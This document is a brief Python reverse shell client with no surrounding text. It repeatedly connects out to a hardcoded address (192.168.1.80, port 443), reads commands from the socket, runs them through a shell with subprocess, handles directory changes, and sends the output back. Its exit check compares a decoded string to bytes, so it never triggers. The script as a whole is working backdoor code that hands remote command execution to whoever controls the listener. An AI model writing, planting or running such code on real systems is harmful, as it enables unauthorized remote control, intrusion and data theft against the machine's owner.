from time import sleep
import subprocess
import socket
import os

IP = "192.168.1.80"
PORT = 443


def connect(ip, port):
    try:
        c =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        return c
    except Exception as e:
        print(f'Error connecting to server: {e}')

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == b'/exit':
                break
            else:
                cmd(c, data)
    except Exception as e:
        print(f'Listen function error: {e}')
        
def cmd(c, data):
    try:
        
        if data.startswith('cd '):
            os.chdir(data[3:].strip())
            return
        
        p=subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        c.send(
            p.stdout.read() + p.stderr.read() +b"\n"
            )
    except Exception as e:
        print(f'Error executing command: {e}')
        
        
if __name__ == "__main__":
    try:
        while True:
            connection = connect(IP, PORT)
            if connection:
                listen(connection)
            else :
                sleep(0.5)
    except KeyboardInterrupt:
        print('Exiting...')
        
    except Exception as e:
        print(f'Error in main: {e}')